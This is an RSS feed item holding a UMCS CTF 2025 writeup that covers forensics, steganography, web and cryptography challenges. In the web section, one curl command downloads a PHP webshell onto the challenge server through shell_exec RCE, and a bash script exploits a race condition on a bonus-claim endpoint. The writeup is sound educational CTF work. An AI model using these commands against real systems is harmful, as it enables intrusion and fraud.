@@ -1,0 +1,1733 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Song's Blog</title><link>https://xph0816.github.io/post/</link><description>Recent content in Posts on Song's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 14 Apr 2025 00:00:00 +0800</lastBuildDate><atom:link href="https://xph0816.github.io/post/index.xml" rel="self" type="application/rss+xml"/><item><title>UMCTF-Writeup</title><link>https://xph0816.github.io/p/umcsctf-writeup/</link><pubDate>Mon, 14 Apr 2025 00:00:00 +0800</pubDate><guid>https://xph0816.github.io/p/umcsctf-writeup/</guid><description>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/feature-umcs-ctf-2025.png" alt="Featured image of post UMCTF-Writeup" />&lt;h1 id="group--dgng">&lt;strong>Group : $+€@d¥G@Ng&lt;/strong>&lt;/h1>
+&lt;h2 id="forensic-hidden-in-plain-graphic">&lt;strong>Forensic: Hidden in Plain Graphic&lt;/strong>&lt;/h2>
+&lt;p>First, I open the PCAP file with Wireshark and while scanning through the traffic, I notice a tcp packet which seems to be suspicious because of the large length of it.&lt;br>
+Thus, I clicked on it to check and noticed that there’s magic bytes of PNG file. Then, I tried to extract the hex and convert it into PNG and here’s the PNG file extracted.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image1.png"
+width="249"
+height="249"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image1_hucc08bb1441f3436969b9a7e3c0719bf1_9679_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image1_hucc08bb1441f3436969b9a7e3c0719bf1_9679_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="100"
+data-flex-basis="240px"
+>&lt;/p>
+&lt;p>I tried to decode the PNG file with online tools first to save time and luckily it works.&lt;br>
+Online tool: &lt;a class="link" href="https://www.aperisolve.com/12dc4632c2fb6cd620988d3349e9639d" target="_blank" rel="noopener"
+>https://www.aperisolve.com/12dc4632c2fb6cd620988d3349e9639d&lt;/a>&lt;br>
+The flag found at the Zsteg part:&lt;/p>
+&lt;h2 id="steganography-broken">&lt;strong>Steganography: Broken&lt;/strong>&lt;/h2>
+&lt;p>Since the mp4 is broken, I try to fix it using an online tool first, and it works. After repair with an online tool, the flag is shown in the video.&lt;br>
+Online tool: &lt;a class="link" href="https://repair.easeus.com/" target="_blank" rel="noopener"
+>https://repair.easeus.com/&lt;/a>&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image2.png"
+width="302"
+height="101"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image2_hu6b0d1b39e4718133db1b4751dac4bd20_12451_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image2_hu6b0d1b39e4718133db1b4751dac4bd20_12451_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="299"
+data-flex-basis="717px"
+>&lt;/p>
+&lt;h2 id="steganography-hotline-miami">&lt;strong>Steganography: Hotline Miami&lt;/strong>&lt;/h2>
+&lt;p>&lt;a class="link" href="https://github.com/umcybersec/umcs_preliminary/tree/main/stego-Hotline_Miami" target="_blank" rel="noopener"
+>https://github.com/umcybersec/umcs_preliminary/tree/main/stego-Hotline_Miami&lt;/a>&lt;/p>
+&lt;p>&lt;strong>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image3.png"
+width="940"
+height="276"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image3_hu9ef0efe2bfe2d5e12d9b3fc987f748ed_92568_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image3_hu9ef0efe2bfe2d5e12d9b3fc987f748ed_92568_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="340"
+data-flex-basis="817px"
+>&lt;/strong>&lt;/p>
+&lt;p>Given three files from this question, I saw that in &lt;a class="link" href="https://raw.githubusercontent.com/umcybersec/umcs_preliminary/refs/heads/main/stego-Hotline_Miami/readme.txt" target="_blank" rel="noopener"
+>readme.txt&lt;/a> is given the flag format.&lt;br>
+&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image4.png"
+width="237"
+height="31"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image4_hu5f7064ff726aa02f2b2e9943da6f3a3e_1215_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image4_hu5f7064ff726aa02f2b2e9943da6f3a3e_1215_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="764"
+data-flex-basis="1834px"
+>&lt;br>
+Next, I found that the wav file must be hidden, so I opened the “Sonic Visualizer” and added a layer for the spectrogram with all channels mixed. I found that the information or keyword is hidden in the wav file shown on the figure below.&lt;br>
+&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image5.png"
+width="602"
+height="343"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image5_hua0d72abb7548f45e948ca0fcce0bc9f0_206038_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image5_hua0d72abb7548f45e948ca0fcce0bc9f0_206038_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="175"
+data-flex-basis="421px"
+>&lt;/p>
+&lt;p>So the verb will be “WATCHING” and the year will be “1989”. Then I go to use an online tool to see the information from the &lt;a class="link" href="https://github.com/umcybersec/umcs_preliminary/blob/main/stego-Hotline_Miami/rooster.jpg" target="_blank" rel="noopener"
+>png file&lt;/a>. &lt;a class="link" href="https://www.aperisolve.com/81954be3cdc998e92aeab90a8a228a18" target="_blank" rel="noopener"
+>https://www.aperisolve.com/81954be3cdc998e92aeab90a8a228a18&lt;/a>&lt;/p>
+&lt;p>Notice that the end of the file contains a name called RICHARD.&lt;br>
+&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image6.png"
+width="940"
+height="426"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image6_hu4c50052777ed52f3d33127d971a0d7f2_167997_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image6_hu4c50052777ed52f3d33127d971a0d7f2_167997_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="220"
+data-flex-basis="529px"
+>&lt;/p>
+&lt;p>Lastly, I guess the word for the “Be” which I put straight forward is “IS”. I try to submit it then boom successfully get the flag.&lt;/p>
+&lt;p>&lt;strong>Flag: umcs{RICHARD_IS_WATCHING_1989}&lt;/strong>&lt;/p>
+&lt;h2 id="web-healthcheck">&lt;strong>Web: Healthcheck&lt;/strong>&lt;/h2>
+&lt;p>&lt;a class="link" href="https://github.com/umcybersec/umcs_preliminary/tree/main/web-healthcheck" target="_blank" rel="noopener"
+>https://github.com/umcybersec/umcs_preliminary/tree/main/web-healthcheck&lt;/a>&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image7.png"
+width="940"
+height="369"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image7_huf83dc4a99e84a6e1c99110b6cda5c452_91882_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image7_huf83dc4a99e84a6e1c99110b6cda5c452_91882_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="254"
+data-flex-basis="611px"
+>&lt;br>
+First of all, I reviewed the source code and found that the source code does some good practice in secure coding but it is not secure enough because of using &lt;code>shell_exec()&lt;/code> function which is vulnerable to Remote Code Execution (RCE). So I input the &lt;code>curl https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/c871f130a12e97090a08d0ab855c1b7a93ef1150/easy-simple-php-webshell.php -o shell.php&lt;/code> command to download the &lt;a class="link" href="https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/c871f130a12e97090a08d0ab855c1b7a93ef1150/easy-simple-php-webshell.php" target="_blank" rel="noopener"
+>shell script&lt;/a> given from online. After that, I browse the shell script page and &lt;code>cat&lt;/code> the flag content.&lt;br>
+&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image8.png"
+width="940"
+height="93"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image8_hu90fb8c50401b65f28ce34c9aed897e55_13675_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image8_hu90fb8c50401b65f28ce34c9aed897e55_13675_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="1010"
+data-flex-basis="2425px"
+>
+Tadaa, the flag shown from the figure above.&lt;/p>
+&lt;p>Flag: umcs{n1c3_j0b_ste4l1ng_myh0p3_4nd_dr3ams}&lt;/p>
+&lt;h2 id="web-straightforward">&lt;strong>Web: Straightforward&lt;/strong>&lt;/h2>
+&lt;p>&lt;strong>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image9.png"
+width="753"
+height="730"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image9_hu36e2abefc5fd83a1518bd0bcc335165e_110664_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image9_hu36e2abefc5fd83a1518bd0bcc335165e_110664_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="103"
+data-flex-basis="247px"
+>&lt;/strong>
+&lt;strong>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image10.png"
+width="940"
+height="351"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image10_huec6d8175dac65ec09b3f4a25019d8acf_28923_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image10_huec6d8175dac65ec09b3f4a25019d8acf_28923_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="267"
+data-flex-basis="642px"
+>&lt;/strong>&lt;/p>
+&lt;p>On this challenge I downloaded the zip provided file and checked on app.py code to get the overview of how the logical works.There was a reveal of few endpoints such as POST /register to creates a new user, POST /claim to claims a daily reward, GET /dashboard to shows current balance, POST /buy_flag to attempts to redeem the flag. From inspecting there I came to understand that the website each user can claim a daily bonus and claiming multiple bonus is the bug. So, I created a bash script using &lt;em>&lt;strong>curl&lt;/strong>&lt;/em> and &lt;em>&lt;strong>xargs&lt;/strong>&lt;/em> to register as a new user, then started to spam /claim points with many requests before the backend checks and prevents duplicate claims. At first I managed to increase the balance with the script but looking back at its logic , I understand that SET balance = balance - 3000 WHERE username =? , it requires to minus 3000 from the existing balance then only it would return with flag.html. So updated the script as below to capture the flag.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image11.png"
+width="940"
+height="333"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image11_hu9a43b6d14733b0aa90e8326449ae4f32_115255_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image11_hu9a43b6d14733b0aa90e8326449ae4f32_115255_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="282"
+data-flex-basis="677px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="se">\#\!&lt;/span>/bin/bash
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">USER&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;ctfuser&lt;/span>&lt;span class="nv">$RANDOM&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">COOKIE&lt;span class="se">\_&lt;/span>FILE&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;cookies.txt&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BASE&lt;span class="se">\_&lt;/span>URL&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://159.69.219.192:7859&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;\[\*\] Registering user: &lt;/span>&lt;span class="nv">$USER&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl &lt;span class="se">\-&lt;/span>s &lt;span class="se">\-&lt;/span>c &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$COOKIE&lt;/span>&lt;span class="s2">\_FILE&amp;#34;&lt;/span> &lt;span class="se">\-&lt;/span>X POST &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$BASE&lt;/span>&lt;span class="s2">\_URL/register&amp;#34;&lt;/span> &lt;span class="se">\\&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\-&lt;/span>d &lt;span class="s2">&amp;#34;username=&lt;/span>&lt;span class="nv">$USER&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="se">\&amp;gt;&lt;/span> /dev/null
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="se">\[&lt;/span> &lt;span class="nv">$?&lt;/span> &lt;span class="se">\-&lt;/span>ne &lt;span class="m">0&lt;/span> &lt;span class="se">\]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Registration failed&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">exit&lt;/span> &lt;span class="m">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;\[\*\] Claiming daily bonus multiple times in parallel...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">seq &lt;span class="m">1&lt;/span> &lt;span class="m">20&lt;/span> &lt;span class="p">|&lt;/span> xargs &lt;span class="se">\-&lt;/span>P20 &lt;span class="se">\-&lt;/span>I&lt;span class="o">{}&lt;/span> curl &lt;span class="se">\-&lt;/span>s &lt;span class="se">\-&lt;/span>b &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$COOKIE&lt;/span>&lt;span class="s2">\_FILE&amp;#34;&lt;/span> &lt;span class="se">\-&lt;/span>X POST &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$BASE&lt;/span>&lt;span class="s2">\_URL/claim&amp;#34;&lt;/span> &lt;span class="se">\&amp;gt;&lt;/span> /dev/null
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;\[\*\] Waiting for DB writes to finish...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sleep &lt;span class="m">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;\[\*\] Checking balance...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">BALANCE&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>curl &lt;span class="se">\-&lt;/span>s &lt;span class="se">\-&lt;/span>b &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$COOKIE&lt;/span>&lt;span class="s2">\_FILE&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$BASE&lt;/span>&lt;span class="s2">\_URL/dashboard&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> grep &lt;span class="se">\-&lt;/span>oP &lt;span class="s1">&amp;#39;\\d{4,}&amp;#39;&lt;/span>&lt;span class="k">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;\[\*\] Current balance: &lt;/span>&lt;span class="nv">$BALANCE&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;\[\*\] Attempting to redeem flag...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">RESPONSE&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>curl &lt;span class="se">\-&lt;/span>s &lt;span class="se">\-&lt;/span>b &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$COOKIE&lt;/span>&lt;span class="s2">\_FILE&amp;#34;&lt;/span> &lt;span class="se">\-&lt;/span>X POST &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$BASE&lt;/span>&lt;span class="s2">\_URL/buy\_flag&amp;#34;&lt;/span>&lt;span class="k">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">\#&lt;/span> Detect UMCS-style flags
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$RESPONSE&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> grep &lt;span class="se">\-&lt;/span>iq &lt;span class="s2">&amp;#34;UMCS&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Flag found\!&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$RESPONSE&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> grep &lt;span class="se">\-&lt;/span>oE &lt;span class="s1">&amp;#39;UMCS\\{.\*?\\}&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Flag not found. Current balance insufficient.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Upon running through the bash script flag was found. So basically, the vulnerability over this challenge lacks concurrency control as multiple requests simultaneously sent to /claim. Each request checks if the user already claimed a bonus but before the server can update the state &amp;ldquo;use&amp;rdquo;, other requests enter in,making receiving more bonus than intended. I came to understand that this is a TOCTOU vulnerability which is a time of check and time of use vulnerability. To prevent this kind of vulnerability,lock the database row or use transactions to avoid simultaneous writes,track requests per session and apply strict rate limiting,implement server-side timestamp checks for bonus claims&lt;/p>
+&lt;p>&lt;strong>Flag: umcs{th3_s0lut10n_1s_pr3tty_str41ghtf0rw4rd_too!}&lt;/strong>&lt;/p>
+&lt;h2 id="cryptography-gist-of-samuel">&lt;strong>Cryptography: Gist of Samuel&lt;/strong>&lt;/h2>
+&lt;p>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image12.png"
+width="449"
+height="439"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image12_hu554ed60667f5cd11f94175da7b2e8a94_46991_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image12_hu554ed60667f5cd11f94175da7b2e8a94_46991_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="102"
+data-flex-basis="245px"
+>&lt;/p>
+&lt;p>Hint: &lt;a class="link" href="https://gist.github.com/umcybersec/55bb6b18159083cf811de96d8fef1583" target="_blank" rel="noopener"
+>https://gist.github.com/umcybersec/55bb6b18159083cf811de96d8fef1583&lt;/a>&lt;/p>
+&lt;p>gist_of_samuel.txt :&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">🚂🚂🚂🚂🚆🚂🚆🚂🚋🚂🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚂🚋🚋🚆🚋🚋🚋🚆🚂🚂🚋🚆🚂🚋🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚋🚂🚆🚂🚋🚂🚆🚂🚂🚆🚋🚋🚂🚂🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚆🚋🚋🚋🚋🚋🚆🚂🚋🚋🚋🚋🚆🚂🚂🚋🚋🚋🚆🚋🚂🚂🚆🚋🚋🚋🚋🚋🚆🚂🚋🚆🚂🚋🚋🚋🚋🚆🚂🚂🚋🚂🚆🚂🚂🚋🚂🚆🚂🚂🚋🚂🚆🚂🚋🚆🚋🚂🚋🚂🚆🚂🚂🚂🚂🚋🚆🚂🚂🚋🚋🚋🚆🚋🚂🚂🚆🚋🚂🚂🚂🚂🚆🚂🚋🚆🚂🚋🚆🚂🚆🚋🚋🚋🚋🚋🚆🚋🚋🚋🚋🚋🚆🚋🚂🚋🚂🚆🚂🚂🚂🚂🚂🚆🚂🚂🚂🚂🚋🚆🚋🚋🚋🚋🚋🚆🚋🚋🚂🚂🚂🚆🚋🚋🚋🚂🚂🚆🚂🚋🚆🚋🚂🚂🚆🚂🚂🚂🚋🚋🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚂🚆🚂🚋🚆🚋🚋🚆🚂🚂🚋🚆🚂🚆🚂🚋🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚂🚆🚂🚆🚂🚋🚆🚂🚋🚂🚂🚆🚂🚋🚂🚂🚆🚋🚂🚋🚋🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚂🚂🚆🚂🚂🚆🚋🚂🚋🚆🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚆🚂🚋🚂🚆🚂🚋🚆🚂🚂🚆🚋🚂🚆🚋🚋🚂🚂🚋🚋🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚆🚋🚂🚆🚋🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚂🚂🚆🚂🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚋🚂🚆🚂🚋🚆🚂🚂🚂🚋🚆🚋🚋🚋🚆🚂🚋🚂🚆🚂🚂🚆🚋🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚂🚆🚂🚂🚋🚆🚋🚋🚆🚋🚂🚂🚂🚆🚂🚆🚂🚋🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚋🚋🚂🚂
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Based on this sequence, I assume it is morse code where&lt;br>
+🚂 represents &amp;rsquo; &lt;strong>.&lt;/strong> &amp;rsquo;&lt;br>
+🚋 represents &amp;rsquo; &lt;strong>-&lt;/strong> &amp;rsquo;&lt;br>
+🚆 represents &amp;rsquo; &lt;strong>space&lt;/strong> '&lt;/p>
+&lt;p>So when decode it, the output is:&lt;br>
+&lt;code>HERE.......IS.......YOUR.......PRIZE.......E012D0A1FFFAC42D6AAE00C54078AD3E.......SAMUEL.......REALLY.......LIKES.......TRAIN,.......AND.......HIS.......FAVORITE.......NUMBER.......IS.......8&lt;/code>&lt;/p>
+&lt;p>After consulting ChatGPT, getting know that E012D0A1FFFAC42D6AAE00C54078AD3E is a hash number, meanwhile combining with the hint given, the URL link is then replaced with this hash number.&lt;br>
+&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image13.png"
+width="940"
+height="354"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image13_hu37bc56ae25c8f92b60e86190df47511d_122254_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image13_hu37bc56ae25c8f92b60e86190df47511d_122254_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="265"
+data-flex-basis="637px"
+>&lt;br>
+Again, we get these unreadable blocks. At first, I thought it would be ciphertext that needed to be decrypted to get the plaintext by using &lt;a class="link" href="https://lingojam.com/%E2%96%88%E2%96%88%E2%96%88%E2%96%88Translator" target="_blank" rel="noopener"
+>Lingojam&lt;/a> but it shows more unreadable characters as shown below.&lt;br>
+&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image14.png"
+width="771"
+height="399"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image14_hua9daed7b5c97e6d617a29f36ec47d577_214137_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image14_hua9daed7b5c97e6d617a29f36ec47d577_214137_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="193"
+data-flex-basis="463px"
+>&lt;/p>
+&lt;p>Well, it was too overthinking, let’s go back to the clues given: &lt;code>SAMUEL.......REALLY.......LIKES.......TRAIN,.......AND.......HIS.......FAVORITE.......NUMBER.......IS.......8.&lt;/code> After searching, the only decryption method named &lt;a class="link" href="https://www.dcode.fr/rail-fence-cipher" target="_blank" rel="noopener"
+>Rail Fence (Zig-Zag) Cipher&lt;/a> is related to trains. Therefore, after decrypting it by using key=8, we will get the rearranged blocks. Download the decrypted blocks in the notepad and adjust the widget until it shows the text below: WILLOWTREECAMPSITE.&lt;br>
+&lt;strong>&lt;img src="https://xph0816.github.io/p/umcsctf-writeup/image15.png"
+width="602"
+height="101"
+srcset="https://xph0816.github.io/p/umcsctf-writeup/image15_hu09a3819594864f10ec034ecffa76b04b_44436_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/umcsctf-writeup/image15_hu09a3819594864f10ec034ecffa76b04b_44436_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="596"
+data-flex-basis="1430px"
+>&lt;/strong>&lt;br>
